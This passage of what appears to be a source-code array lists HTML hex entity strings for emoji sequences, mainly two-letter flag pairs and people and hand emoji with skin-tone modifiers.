'&#x1f1f0;&#x1f1f7;', '&#x1f1f0;&#x1f1fc;', '&#x1f1f0;&#x1f1fe;', '&#x1f1f0;&#x1f1ff;', '&#x1f1f1;&#x1f1e6;', '&#x1f1f1;&#x1f1e7;', '&#x1f1f1;&#x1f1e8;', '&#x1f1f1;&#x1f1ee;', '&#x1f1f1;&#x1f1f0;', '&#x1f1f1;&#x1f1f7;', '&#x1f1f1;&#x1f1f8;', '&#x1f1f1;&#x1f1f9;', '&#x1f1f1;&#x1f1fa;', '&#x1f1f1;&#x1f1fb;', '&#x1f1f1;&#x1f1fe;', '&#x1f1f2;&#x1f1e6;', '&#x1f1f2;&#x1f1e8;', '&#x1f1f2;&#x1f1e9;', '&#x1f1f2;&#x1f1ea;', '&#x1f1f2;&#x1f1eb;', '&#x1f1f2;&#x1f1ec;', '&#x1f1f2;&#x1f1ed;', '&#x1f1f2;&#x1f1f0;', '&#x1f1f2;&#x1f1f1;', '&#x1f1f2;&#x1f1f2;', '&#x1f1f2;&#x1f1f3;', '&#x1f1f2;&#x1f1f4;', '&#x1f1f2;&#x1f1f5;', '&#x1f1f2;&#x1f1f6;', '&#x1f1f2;&#x1f1f7;', '&#x1f1f2;&#x1f1f8;', '&#x1f1f2;&#x1f1f9;', '&#x1f1f2;&#x1f1fa;', '&#x1f1f2;&#x1f1fb;', '&#x1f1f2;&#x1f1fc;', '&#x1f1f2;&#x1f1fd;', '&#x1f1f2;&#x1f1fe;', '&#x1f1f2;&#x1f1ff;', '&#x1f1f3;&#x1f1e6;', '&#x1f1f3;&#x1f1e8;', '&#x1f1f3;&#x1f1ea;', '&#x1f1f3;&#x1f1eb;', '&#x1f1f3;&#x1f1ec;', '&#x1f1f3;&#x1f1ee;', '&#x1f1f3;&#x1f1f1;', '&#x1f1f3;&#x1f1f4;', '&#x1f1f3;&#x1f1f5;', '&#x1f1f3;&#x1f1f7;', '&#x1f1f3;&#x1f1fa;', '&#x1f1f3;&#x1f1ff;', '&#x1f1f4;&#x1f1f2;', '&#x1f1f5;&#x1f1e6;', '&#x1f1f5;&#x1f1ea;', '&#x1f1f5;&#x1f1eb;', '&#x1f1f5;&#x1f1ec;', '&#x1f1f5;&#x1f1ed;', '&#x1f1f5;&#x1f1f0;', '&#x1f1f5;&#x1f1f1;', '&#x1f1f5;&#x1f1f2;', '&#x1f1f5;&#x1f1f3;', '&#x1f1f5;&#x1f1f7;', '&#x1f1f5;&#x1f1f8;', '&#x1f1f5;&#x1f1f9;', '&#x1f1f5;&#x1f1fc;', '&#x1f1f5;&#x1f1fe;', '&#x1f1f6;&#x1f1e6;', '&#x1f1f7;&#x1f1ea;', '&#x1f1f7;&#x1f1f4;', '&#x1f1f7;&#x1f1f8;', '&#x1f1f7;&#x1f1fa;', '&#x1f1f7;&#x1f1fc;', '&#x1f1f8;&#x1f1e6;', '&#x1f1f8;&#x1f1e7;', '&#x1f1f8;&#x1f1e8;', '&#x1f1f8;&#x1f1e9;', '&#x1f1f8;&#x1f1ea;', '&#x1f1f8;&#x1f1ec;', '&#x1f1f8;&#x1f1ed;', '&#x1f1f8;&#x1f1ee;', '&#x1f1f8;&#x1f1ef;', '&#x1f1f8;&#x1f1f0;', '&#x1f1f8;&#x1f1f1;', '&#x1f1f8;&#x1f1f2;', '&#x1f1f8;&#x1f1f3;', '&#x1f1f8;&#x1f1f4;', '&#x1f1f8;&#x1f1f7;', '&#x1f1f8;&#x1f1f8;', '&#x1f1f8;&#x1f1f9;', '&#x1f1f8;&#x1f1fb;', '&#x1f1f8;&#x1f1fd;', '&#x1f1f8;&#x1f1fe;', '&#x1f1f8;&#x1f1ff;', '&#x1f1f9;&#x1f1e6;', '&#x1f1f9;&#x1f1e8;', '&#x1f1f9;&#x1f1e9;', '&#x1f1f9;&#x1f1eb;', '&#x1f1f9;&#x1f1ec;', '&#x1f1f9;&#x1f1ed;', '&#x1f1f9;&#x1f1ef;', '&#x1f1f9;&#x1f1f0;', '&#x1f1f9;&#x1f1f1;', '&#x1f1f9;&#x1f1f2;', '&#x1f1f9;&#x1f1f3;', '&#x1f1f9;&#x1f1f4;', '&#x1f1f9;&#x1f1f7;', '&#x1f1f9;&#x1f1f9;', '&#x1f1f9;&#x1f1fb;', '&#x1f1f9;&#x1f1fc;', '&#x1f1f9;&#x1f1ff;', '&#x1f1fa;&#x1f1e6;', '&#x1f1fa;&#x1f1ec;', '&#x1f1fa;&#x1f1f2;', '&#x1f1fa;&#x1f1f3;', '&#x1f1fa;&#x1f1f8;', '&#x1f1fa;&#x1f1fe;', '&#x1f1fa;&#x1f1ff;', '&#x1f1fb;&#x1f1e6;', '&#x1f1fb;&#x1f1e8;', '&#x1f1fb;&#x1f1ea;', '&#x1f1fb;&#x1f1ec;', '&#x1f1fb;&#x1f1ee;', '&#x1f1fb;&#x1f1f3;', '&#x1f1fb;&#x1f1fa;', '&#x1f1fc;&#x1f1eb;', '&#x1f1fc;&#x1f1f8;', '&#x1f1fd;&#x1f1f0;', '&#x1f1fe;&#x1f1ea;', '&#x1f1fe;&#x1f1f9;', '&#x1f1ff;&#x1f1e6;', '&#x1f1ff;&#x1f1f2;', '&#x1f1ff;&#x1f1fc;', '&#x1f385;&#x1f3fb;', '&#x1f385;&#x1f3fc;', '&#x1f385;&#x1f3fd;', '&#x1f385;&#x1f3fe;', '&#x1f385;&#x1f3ff;', '&#x1f3c2;&#x1f3fb;', '&#x1f3c2;&#x1f3fc;', '&#x1f3c2;&#x1f3fd;', '&#x1f3c2;&#x1f3fe;', '&#x1f3c2;&#x1f3ff;', '&#x1f3c3;&#x1f3fb;', '&#x1f3c3;&#x1f3fc;', '&#x1f3c3;&#x1f3fd;', '&#x1f3c3;&#x1f3fe;', '&#x1f3c3;&#x1f3ff;', '&#x1f3c4;&#x1f3fb;', '&#x1f3c4;&#x1f3fc;', '&#x1f3c4;&#x1f3fd;', '&#x1f3c4;&#x1f3fe;', '&#x1f3c4;&#x1f3ff;', '&#x1f3c7;&#x1f3fb;', '&#x1f3c7;&#x1f3fc;', '&#x1f3c7;&#x1f3fd;', '&#x1f3c7;&#x1f3fe;', '&#x1f3c7;&#x1f3ff;', '&#x1f3ca;&#x1f3fb;', '&#x1f3ca;&#x1f3fc;', '&#x1f3ca;&#x1f3fd;', '&#x1f3ca;&#x1f3fe;', '&#x1f3ca;&#x1f3ff;', '&#x1f3cb;&#x1f3fb;', '&#x1f3cb;&#x1f3fc;', '&#x1f3cb;&#x1f3fd;', '&#x1f3cb;&#x1f3fe;', '&#x1f3cb;&#x1f3ff;', '&#x1f3cc;&#x1f3fb;', '&#x1f3cc;&#x1f3fc;', '&#x1f3cc;&#x1f3fd;', '&#x1f3cc;&#x1f3fe;', '&#x1f3cc;&#x1f3ff;', '&#x1f442;&#x1f3fb;', '&#x1f442;&#x1f3fc;', '&#x1f442;&#x1f3fd;', '&#x1f442;&#x1f3fe;', '&#x1f442;&#x1f3ff;', '&#x1f443;&#x1f3fb;', '&#x1f443;&#x1f3fc;', '&#x1f443;&#x1f3fd;', '&#x1f443;&#x1f3fe;', '&#x1f443;&#x1f3ff;', '&#x1f446;&#x1f3fb;', '&#x1f446;&#x1f3fc;', '&#x1f446;&#x1f3fd;', '&#x1f446;&#x1f3fe;', '&#x1f446;&#x1f3ff;', '&#x1f447;&#x1f3fb;', '&#x1f447;&#x1f3fc;', '&#x1f447;&#x1f3fd;', '&#x1f447;&#x1f3fe;', '&#x1f447;&#x1f3ff;', '&#x1f448;&#x1f3fb;', '&#x1f448;&#x1f3fc;', '&#x1f448;&#x1f3fd;', '&#x1f448;&#x1f3fe;', '&#x1f448;&#x1f3ff;', '&#x1f449;&#x1f3fb;', '&#x1f449;&#x1f3fc;', '&#x1f449;&#x1f3fd;', '&#x1f449;&#x1f3fe;', '&#x1f449;&#x1f3ff;', '&#x1f44a;&#x1f3fb;', '&#x1f44a;&#x1f3fc;', '&#x1f44a;&#x1f3fd;', '&#x1f44a;&#x1f3fe;', '&#x1f44a;&#x1f3ff;', '&#x1f44b;&#x1f3fb;', '&#x1f44b;&#x1f3fc;', '&#x1f44b;&#x1f3fd;', '&#x1f44b;&#x1f3fe;', '&#x1f44b;&#x1f3ff;', '&#x1f44c;&#x1f3fb;', '&#x1f44c;&#x1f3fc;', '&#x1f44c;&#x1f3fd;', '&#x1f44c;&#x1f3fe;', '&#x1f44c;&#x1f3ff;', '&#x1f44d;&#x1f3fb;', '&#x1f44d;&#x1f3fc;', '&#x1f44d;&#x1f3fd;', '&#x1f44d;&#x1f3fe;', '&#x1f44d;&#x1f3ff;', '&#x1f44e;&#x1f3fb;', '&#x1f44e;&#x1f3fc;', '&#x1f44e;&#x1f3fd;', '&#x1f44e;&#x1f3fe;', '&#x1f44e;&#x1f3ff;', '&#x1f44f;&#x1f3fb;', '&#x1f44f;&#x1f3fc;', '&#x1f44f;&#x1f3fd;', '&#x1f44f;&#x1f3fe;', '&#x1f44f;&#x1f3ff;', '&#x1f450;&#x1f3fb;', '&#x1f450;&#x1f3fc;', '&#x1f450;&#x1f3fd;', '&#x1f450;&#x1f3fe;', '&#x1f450;&#x1f3ff;', '&#x1f466;&#x1f3fb;', '&#x1f466;&#x1f3fc;', '&#x1f466;&#x1f3fd;', '&#x1f466;&#x1f3fe;', '&#x1f466;&#x1f3ff;', '&#x1f467;&#x1f3fb;', '&#x1f467;&#x1f3fc;', '&#x1f467;&#x1f3fd;', '&#x1f467;&#x1f3fe;', '&#x1f467;&#x1f3ff;', '&#x1f468;&#x1f3fb;', '&#x1f468;&#x1f3fc;', '&#x1f468;&#x1f3fd;', '&#x1f468;&#x1f3fe;', '&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3ff;', '&#x1f46b;&#x1f3fb;', '&#x1f46b;&#x1f3fc;', '&#x1f46b;&#x1f3fd;', '&#x1f46b;&#x1f3fe;', '&#x1f46b;&#x1f3ff;', '&#x1f46c;&#x1f3fb;', '&#x1f46c;&#x1f3fc;', '&#x1f46c;&#x1f3fd;', '&#x1f46c;&#x1f3fe;', '&#x1f46c;&#x1f3ff;', '&#x1f46d;&#x1f3fb;', '&#x1f46d;&#x1f3fc;', '&#x1f46d;&#x1f3fd;', '&#x1f46d;&#x1f3fe;', '&#x1f46d;&#x1f3ff;', '&#x1f46e;&#x1f3fb;', '&#x1f46e;&#x1f3fc;', '&#x1f46e;&#x1f3fd;', '&#x1f46e;&#x1f3fe;', '&#x1f46e;&#x1f3ff;', '&#x1f470;&#x1f3fb;', '&#x1f470;&#x1f3fc;', '&#x1f470;&#x1f3fd;', '&#x1f470;&#x1f3fe;', '&#x1f470;&#x1f3ff;', '&#x1f471;&#x1f3fb;', '&#x1f471;&#x1f3fc;', '&#x1f471;&#x1f3fd;', '&#x1f471;&#x1f3fe;', '&#x1f471;&#x1f3ff;', '&#x1f472;&#x1f3fb;', '&#x1f472;&#x1f3fc;', '&#x1f472;&#x1f3fd;', '&#x1f472;&#x1f3fe;', '&#x1f472;&#x1f3ff;', '&#x1f473;&#x1f3fb;', '&#x1f473;&#x1f3fc;', '&#x1f473;&#x1f3fd;', '&#x1f473;&#x1f3fe;', '&#x1f473;&#x1f3ff;', '&#x1f474;&#x1f3fb;', '&#x1f474;&#x1f3fc;', '&#x1f474;&#x1f3fd;', '&#x1f474;&#x1f3fe;', '&#x1f474;&#x1f3ff;', '&#x1f475;&#x1f3fb;', '&#x1f475;&#x1f3fc;', '&#x1f475;&#x1f3fd;', '&#x1f475;&#x1f3fe;', '&#x1f475;&#x1f3ff;', '&#x1f476;&#x1f3fb;', '&#x1f476;&#x1f3fc;', '&#x1f476;&#x1f3fd;', '&#x1f476;&#x1f3fe;', '&#x1f476;&#x1f3ff;', '&#x1f477;&#x1f3fb;', '&#x1f477;&#x1f3fc;', '&#x1f477;&#x1f3fd;', '&#x1f477;&#x1f3fe;', '&#x1f477;&#x1f3ff;', '&#x1f478;&#x1f3fb;', '&#x1f478;&#x1f3fc;', '&#x1f478;&#x1f3fd;', '&#x1f478;&#x1f3fe;', '&#x1f478;&#x1f3ff;', '&#x1f47c;&#x1f3fb;', '&#x1f47c;&#x1f3fc;', '&#x1f47c;&#x1f3fd;', '&#x1f47c;&#x1f3fe;', '&#x1f47c;&#x1f3ff;', '&#x1f481;&#x1f3fb;', '&#x1f481;&#x1f3fc;', '&#x1f481;&#x1f3fd;', '&#x1f481;&#x1f3fe;', '&#x1f481;&#x1f3ff;', '&#x1f482;&#x1f3fb;', '&#x1f482;&#x1f3fc;', '&#x1f482;&#x1f3fd;', '&#x1f482;&#x1f3fe;', '&#x1f482;&#x1f3ff;', '&#x1f483;&#x1f3fb;', '&#x1f483;&#x1f3fc;', '&#x1f483;&#x1f3fd;', '&#x1f483;&#x1f3fe;', '&#x1f483;&#x1f3ff;', '&#x1f485;&#x1f3fb;', '&#x1f485;&#x1f3fc;', '&#x1f485;&#x1f3fd;', '&#x1f485;&#x1f3fe;', '&#x1f485;&#x1f3ff;', '&#x1f486;&#x1f3fb;', '&#x1f486;&#x1f3fc;', '&#x1f486;&#x1f3fd;', '&#x1f486;&#x1f3fe;', '&#x1f486;&#x1f3ff;', '&#x1f487;&#x1f3fb;', '&#x1f487;&#x1f3fc;', '&#x1f487;&#x1f3fd;', '&#x1f487;&#x1f3fe;', '&#x1f487;&#x1f3ff;', '&#x1f48f;&#x1f3fb;', '&#x1f48f;&#x1f3fc;', '&#x1f48f;&#x1f3fd;', '&#x1f48f;&#x1f3fe;', '&#x1f48f;&#x1f3ff;', '&#x1f491;&#x1f3fb;', '&#x1f491;&#x1f3fc;', '&#x1f491;&#x1f3fd;', '&#x1f491;&#x1f3fe;', '&#x1f491;&#x1f3ff;', '&#x1f4aa;&#x1f3fb;', '&#x1f4aa;&#x1f3fc;', '&#x1f4aa;&#x1f3fd;', '&#x1f4aa;&#x1f3fe;', '&#x1f4aa;&#x1f3ff;', '&#x1f574;&#x1f3fb;', '&#x1f574;&#x1f3fc;', '&#x1f574;&#x1f3fd;', '&#x1f574;&#x1f3fe;', '&#x1f574;&#x1f3ff;', '&#x1f575;&#x1f3fb;', '&#x1f575;&#x1f3fc;', '&#x1f575;&#x1f3fd;', '&#x1f575;&#x1f3fe;', '&#x1f575;&#x1f3ff;', '&#x1f57a;&#x1f3fb;', '&#x1f57a;&#x1f3fc;', '&#x1f57a;&#x1f3fd;', '&#x1f57a;&#x1f3fe;', '&#x1f57a;&#x1f3ff;', '&#x1f590;&#x1f3fb;', '&#x1f590;&#x1f3fc;', '&#x1f590;&#x1f3fd;', '&#x1f590;&#x1f3fe;', '&#x1f590;&#x1f3ff;', '&#x1f595;&#x1f3fb;', '&#x1f595;&#x1f3fc;', '&#x1f595;&#x1f3fd;', '&#x1f595;&#x1f3fe;', '&#x1f595;&#x1f3ff;', '&#x1f596;&#x1f3fb;', '&#x1f596;&#x1f3fc;', '&#x1f596;&#x1f3fd;', '&#x1f596;&#x1f3fe;', '&#x1f596;&#x1f3ff;', '&#x1f645;&#x1f3fb;', '&#x1f645;&#x1f3fc;', '&#x1f645;&#x1f3fd;', '&#x1f645;&#x1f3fe;', '&#x1f645;&#x1f3ff;', '&#x1f646;&#x1f3fb;', '&#x1f646;&#x1f3fc;', '&#x1f646;&#x1f3fd;', '&#x1f646;&#x1f3fe;', '&#x1f646;&#x1f3ff;', '&#x1f647;&#x1f3fb;', '&#x1f647;&#x1f3fc;', '&#x1f647;&#x1f3fd;', '&#x1f647;&#x1f3fe;', '&#x1f647;&#x1f3ff;', '&#x1f64b;&#x1f3fb;', '&#x1f64b;&#x1f3fc;', '&#x1f64b;&#x1f3fd;', '&#x1f64b;&#x1f3fe;', '&#x1f64b;&#x1f3ff;', '&#x1f64c;&#x1f3fb;', '&#x1f64c;&#x1f3fc;', '&#x1f64c;&#x1f3fd;', '&#x1f64c;&#x1f3fe;', '&#x1f64c;&#x1f3ff;', '&#x1f64d;&#x1f3fb;', '&#x1f64d;&#x1f3fc;', '&#x1f64d;&#x1f3fd;', '&#x1f64d;&#x1f3fe;', '&#x1f64d;&#x1f3ff;', '&#x1f64e;&#x1f3fb;', '&#x1f64e;&#x1f3fc;', '&#x1f64e;&#x1f3fd;', '&#x1f64e;&#x1f3fe;', '&#x1f64e;&#x1f3ff;', '&#x1f64f;&#x1f3fb;', '&#x1f64f;&#x1f3fc;', '&#x1f64f;&#x1f3fd;', '&#x1f64f;&#x1f3fe;', '&#x1f64f;&#x1f3ff;', '&#x1f6a3;&#x1f3fb;', '&#x1f6a3;&#x1f3fc;', '&#x1f6a3;&#x1f3fd;', '&#x1f6a3;&#x1f3fe;', '&#x1f6a3;&#x1f3ff;', '&#x1f6b4;&#x1f3fb;', '&#x1f6b4;&#x1f3fc;', '&#x1f6b4;&#x1f3fd;', '&#x1f6b4;&#x1f3fe;', '&#x1f6b4;&#x1f3ff;', '&#x1f6b5;&#x1f3fb;', '&#x1f6b5;&#x1f3fc;', '&#x1f6b5;&#x1f3fd;', '&#x1f6b5;&#x1f3fe;', '&#x1f6b5;&#x1f3ff;', '&#x1f6b6;&#x1f3fb;', '&#x1f6b6;&#x1f3fc;', '&#x1f6b6;&#x1f3fd;', '&#x1f6b6;&#x1f3fe;', '&#x1f6b6;&#x1f3ff;', '&#x1f6c0;&#x1f3fb;', '&#x1f6c0;&#x1f3fc;', '&#x1f6c0;&#x1f3fd;', '&#x1f6c0;&#x1f3fe;', '&#x1f6c0;&#x1f3ff;', '&#x1f6cc;&#x1f3fb;', '&#x1f6cc;&#x1f3fc;', '&#x1f6cc;&#x1f3fd;', '&#x1f6cc;&#x1f3fe;', '&#x1f6cc;&#x1f3ff;', '&#x1f90c;&#x1f3fb;', '&#x1f90c;&#x1f3fc;', '&#x1f90c;&#x1f3fd;', '&#x1f90c;&#x1f3fe;', '&#x1f90c;&#x1f3ff;', '&#x1f90f;&#x1f3fb;', '&#x1f90f;&#x1f3fc;', '&#x1f90f;&#x1f3fd;', '&#x1f90f;&#x1f3fe;', '&#x1f90f;&#x1f3ff;', '&#x1f918;&#x1f3fb;', '&#x1f918;&#x1f3fc;', '&#x1f918;&#x1f3fd;', '&#x1f918;&#x1f3fe;', '&#x1f918;&#x1f3ff;', '&#x1f919;&#x1f3fb;', '&#x1f919;&#x1f3fc;', '&#x1f919;&#x1f3fd;', '&#x1f919;&#x1f3fe;', '&#x1f919;&#x1f3ff;', '&#x1f91a;&#x1f3fb;', '&#x1f91a;&#x1f3fc;', '&#x1f91a;&#x1f3fd;', '&#x1f91a;&#x1f3fe;', '&#x1f91a;&#x1f3ff;', '&#x1f91b;&#x1f3fb;', '&#x1f91b;&#x1f3fc;', '&#x1f91b;&#x1f3fd;', '&#x1f91b;&#x1f3fe;', '&#x1f91b;&#x1f3ff;', '&#x1f91c;&#x1f3fb;', '&#x1f91c;&#x1f3fc;', '&#x1f91c;&#x1f3fd;', '&#x1f91c;&#x1f3fe;', '&#x1f91c;&#x1f3ff;', '&#x1f91d;&#x1f3fb;', '&#x1f91d;&#x1f3fc;', '&#x1f91d;&#x1f3fd;', '&#x1f91d;&#x1f3fe;', '&#x1f91d;&#x1f3ff;', '&#x1f91e;&#x1f3fb;', '&#x1f91e;&#x1f3fc;', '&#x1f91e;&#x1f3fd;', '&#x1f91e;&#x1f3fe;', '&#x1f91e;&#x1f3ff;', '&#x1f91f;&#x1f3fb;', '&#x1f91f;&#x1f3fc;', '&#x1f91f;&#x1f3fd;', '&#x1f91f;&#x1f3fe;', '&#x1f91f;&#x1f3ff;', '&#x1f926;&#x1f3fb;', '&#x1f926;&#x1f3fc;', '&#x1f926;&#x1f3fd;', '&#x1f926;&#x1f3fe;', '&#x1f926;&#x1f3ff;', '&#x1f930;&#x1f3fb;', '&#x1f930;&#x1f3fc;', '&#x1f930;&#x1f3fd;', '&#x1f930;&#x1f3fe;', '&#x1f930;&#x1f3ff;', '&#x1f931;&#x1f3fb;', '&#x1f931;&#x1f3fc;', '&#x1f931;&#x1f3fd;', '&#x1f931;&#x1f3fe;', '&#x1f931;&#x1f3ff;', '&#x1f932;&#x1f3fb;', '&#x1f932;&#x1f3fc;', '&#x1f932;&#x1f3fd;', '&#x1f932;&#x1f3fe;', '&#x1f932;&#x1f3ff;', '&#x1f933;&#x1f3fb;', '&#x1f933;&#x1f3fc;', '&#x1f933;&#x1f3fd;', '&#x1f933;&#x1f3fe;', '&#x1f933;&#x1f3ff;', '&#x1f934;&#x1f3fb;', '&#x1f934;&#x1f3fc;', '&#x1f934;&#x1f3fd;', '&#x1f934;&#x1f3fe;', '&#x1f934;&#x1f3ff;', '&#x1f935;&#x1f3fb;', '&#x1f935;&#x1f3fc;', '&#x1f935;&#x1f3fd;', '&#x1f935;&#x1f3fe;', '&#x1f935;&#x1f3ff;', '&#x1f936;&#x1f3fb;', '&#x1f936;&#x1f3fc;', '&#x1f936;&#x1f3fd;', '&#x1f936;&#x1f3fe;', '&#x1f936;&#x1f3ff;', '&#x1f937;&#x1f3fb;', '&#x1f937;&#x1f3fc;', '&#x1f937;&#x1f3fd;', '&#x1f937;&#x1f3fe;', '&#x1f937;&#x1f3ff;', '&#x1f938;&#x1f3fb;', '&#x1f938;&#x1f3fc;', '&#x1f938;&#x1f3fd;', '&#x1f938;&#x1f3fe;', '&#x1f938;&#x1f3ff;', '&#x1f939;&#x1f3fb;', '&#x1f939;&#x1f3fc;', '&#x1f939;&#x1f3fd;', '&#x1f939;&#x1f3fe;', '&#x1f939;&#x1f3ff;', '&#x1f93d;&#x1f3fb;', '&#x1f93d;&#x1f3fc;', '&#x1f93d;&#x1f3fd;', '&#x1f93d;&#x1f3fe;', '&#x1f93d;&#x1f3ff;', '&#x1f93e;&#x1f3fb;', '&#x1f93e;&#x1f3fc;', '&#x1f93e;&#x1f3fd;', '&#x1f93e;&#x1f3fe;', '&#x1f93e;&#x1f3ff;', '&#x1f977;&#x1f3fb;', '&#x1f977;&#x1f3fc;', '&#x1f977;&#x1f3fd;', '&#x1f977;&#x1f3fe;', '&#x1f977;&#x1f3ff;', '&#x1f9b5;&#x1f3fb;', '&#x1f9b5;&#x1f3fc;', '&#x1f9b5;&#x1f3fd;', '&#x1f9b5;&#x1f3fe;', '&#x1f9b5;&#x1f3ff;', '&#x1f9b6;&#x1f3fb;', '&#x1f9b6;&#x1f3fc;', '&#x1f9b6;&#x1f3fd;', '&#x1f9b6;&#x1f3fe;', '&#x1f9b6;&#x1f3ff;', '&#x1f9b8;&#x1f3fb;', '&#x1f9b8;&#x1f3fc;', '&#x1f9b8;&#x1f3fd;', '&#x1f9b8;&#x1f3fe;', '&#x1f9b8;&#x1f3ff;', '&#x1f9b9;&#x1f3fb;', '&#x1f9b9;&#x1f3fc;', '&#x1f9b9;&#x1f3fd;', '&#x1f9b9;&#x1f3fe;', '&#x1f9b9;&#x1f3ff;', '&#x1f9bb;&#x1f3fb;', '&#x1f9bb;&#x1f3fc;', '&#x1f9bb;&#x1f3fd;', '&#x1f9bb;&#x1f3fe;', '&#x1f9bb;&#x1f3ff;', '&#x1f9cd;&#x1f3fb;', '&#x1f9cd;&#x1f3fc;', '&#x1f9cd;&#x1f3fd;', '&#x1f9cd;&#x1f3fe;', '&#x1f9cd;&#x1f3ff;', '&#x1f9ce;&#x1f3fb;', '&#x1f9ce;&#x1f3fc;', '&#x1f9ce;&#x1f3fd;', '&#x1f9ce;&#x1f3fe;', '&#x1f9ce;&#x1f3ff;', '&#x1f9cf;&#x1f3fb;', '&#x1f9cf;&#x1f3fc;', '&#x1f9cf;&#x1f3fd;', '&#x1f9cf;&#x1f3fe;', '&#x1f9cf;&#x1f3ff;', '&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3ff;', '&#x1f9d2;&#x1f3fb;', '&#x1f9d2;&#x1f3fc;', '&#x1f9d2;&#x1f3fd;', '&#x1f9d2;&#x1f3fe;', '&#x1f9d2;&#x1f3ff;', '&#x1f9d3;&#x1f3fb;', '&#x1f9d3;&#x1f3fc;', '&#x1f9d3;&#x1f3fd;', '&#x1f9d3;&#x1f3fe;', '&#x1f9d3;&#x1f3ff;', '&#x1f9d4;&#x1f3fb;', '&#x1f9d4;&#x1f3fc;', '&#x1f9d4;&#x1f3fd;', '&#x1f9d4;&#x1f3fe;', '&#x1f9d4;&#x1f3ff;', '&#x1f9d5;&#x1f3fb;', '&#x1f9d5;&#x1f3fc;', '&#x1f9d5;&#x1f3fd;', '&#x1f9d5;&#x1f3fe;', '&#x1f9d5;&#x1f3ff;', '&#x1f9d6;&#x1f3fb;', '&#x1f9d6;&#x1f3fc;', '&#x1f9d6;&#x1f3fd;', '&#x1f9d6;&#x1f3fe;', '&#x1f9d6;&#x1f3ff;', '&#x1f9d7;&#x1f3fb;', '&#x1f9d7;&#x1f3fc;', '&#x1f9d7;&#x1f3fd;', '&#x1f9d7;&#x1f3fe;', '&#x1f9d7;&#x1f3ff;', '&#x1f9d8;&#x1f3fb;', '&#x1f9d8;&#x1f3fc;', '&#x1f9d8;&#x1f3fd;', '&#x1f9d8;&#x1f3fe;', '&#x1f9d8;&#x1f3ff;', '&#x1f9d9;&#x1f3fb;', '&#x1f9d9;&#x1f3fc;', '&#x1f9d9;&#x1f3fd;', '&#x1f9d9;&#x1f3fe;', '&#x1f9d9;&#x1f3ff;', '&#x1f9da;&#x1f3fb;', '&#x1f9da;&#x1f3fc;', '&#x1f9da;&#x1f3fd;', '&#x1f9da;&#x1f3fe;', '&#x1f9da;&#x1f3ff;', '&#x1f9db;&#x1f3fb;', '&#x1f9db;&#x1f3fc;', '&#x1f9db;&#x1f3fd;', '&#x1f9db;&#x1f3fe;', '&#x1f9db;&#x1f3ff;', '&#x1f9dc;&#x1f3fb;', '&#x1f9dc;&#x1f3fc;', '&#x1f9dc;&#x1f3fd;', '&#x1f9dc;&#x1f3fe;', '&#x1f9dc;&#x1f3ff;', '&#x1f9dd;&#x1f3fb;', '&#x1f9dd;&#x1f3fc;', '&#x1f9dd;&#x1f3fd;', '&#x1f9dd;&#x1f3fe;', '&#x1f9dd;&#x1f3ff;', '&#x1fac3;&#x1f3fb;', '&#x1fac3;&#x1f3fc;', '&#x1fac3;&#x1f3fd;', '&#x1fac3;&#x1f3fe;', '&#x1fac3;&#x1f3ff;', '&#x1fac4;&#x1f3fb;', '&#x1fac4;&#x1f3fc;', '&#x1fac4;&#x1f3fd;', '&#x1fac4;&#x1f3fe;', '&#x1fac4;&#x1f3ff;', '&#x1fac5;&#x1f3fb;', '&#x1fac5;&#x1f3fc;', '&#x1fac5;&#x1f3fd;', '&#x1fac5;&#x1f3fe;', '&#x1fac5;&#x1f3ff;', '&#x1faf0;&#x1f3fb;', '&#x1faf0;&#x1f3fc;', '&#x1faf0;&#x1f3fd;', '&#x1faf0;&#x1f3fe;', '&#x1faf0;&#x1f3ff;', '&#x1faf1;&#x1f3fb;', '&#x1faf1;&#x1f3fc;', '&#x1faf1;&#x1f3fd;', '&#x1faf1;&#x1f3fe;', '&#x1faf1;&#x1f3ff;', '&#x1faf2;&#x1f3fb;', '&#x1faf2;&#x1f3fc;', '&#x1faf2;&#x1f3fd;', '&#x1faf2;&#x1f3fe;', '&#x1faf2;&#x1f3ff;', '&#x1faf3;&#x1f3fb;', '&#x1faf3;&#x1f3fc;', '&#x1faf3;&#x1f3fd;', '&#x1faf3;&#x1f3fe;', '&#x1faf3;&#x1f3ff;', '&#x1faf4;&#x1f3fb;', '&#x1faf4;&#x1f3fc;', '&#x1faf4;&#x1f3fd;', '&#x1faf4;&#x1f3fe;', '&#x1faf4;&#x1f3ff;', '&#x1faf5;&#x1f3fb;', '&#x1faf5;&#x1f3fc;', '&#x1faf5;&#x1f3fd;', '&#x1faf5;&#x1f3fe;', '&#x1faf5;&#x1f3ff;', '&#x1faf6;&#x1f3fb;', '&#x1faf6;&#x1f3fc;', '&#x1faf6;&#x1f3fd;', '&#x1faf6;&#x1f3fe;', '&#x1faf6;&#x1f3ff;', '&#x1faf7;&#x1f3fb;', '&#x1faf7;&#x1f3fc;', '&#x1faf7;&#x1f3fd;', '&#x1faf7;&#x1f3fe;', '&#x1faf7;&#x1f3ff;', '&#x1faf8;&#x1f3fb;', '&#x1faf8;&#x1f3fc;', '&#x1faf8;&#x1f3fd;', '&#x1faf8;&#x1f3fe;', '&#x1faf8;&#x1f3ff;', '&#x261d;&#x1f3fb;', '&#x261d;&#x1f3fc;', '&#x261d;&#x1f3fd;', '&#x261d;&#x1f3fe;', '&#x261d;&#x1f3ff;', '&#x26f7;&#x1f3fb;', '&#x26f7;&#x1f3fc;', '&#x26f7;&#x1f3fd;', '&#x26f7;&#x1f3fe;', '&#x26f7;&#x1f3ff;', '&#x26f9;&#x1f3fb;', '&#x26f9;&#x1f3fc;', '&#x26f9;&#x1f3fd;', '&#x26f9;&#x1f3fe;', '&#x26f9;&#x1f3ff;', '&#x270a;&#x1f3fb;', '&#x270a;&#x1f3fc;', '&#x270a;&#x1f3fd;', '&#x270a;&#x1f3fe;', '&#x270a;&#x1f3ff;', '&#x270b;&#x1f3fb;', '&#x270b;&#x1f3fc;', '&#x270b;&#x1f3fd;', '&#x270b;&#x1f3fe;', '&#x270b;&#x1f3ff;', '&#x270c;&#x1f3fb;', '&#x270c;&#x1f3fc;', '&#x270c;&#x1f3fd;', '&#x270c;&#x1f3fe;', '&#x270c;&#x1f3ff;', '&#x270d;&#x1f3fb;', '&#x270d;&#x1f3fc;', '&#x270d;&#x1f3fd;', '&#x270d;&#x1f3fe;', 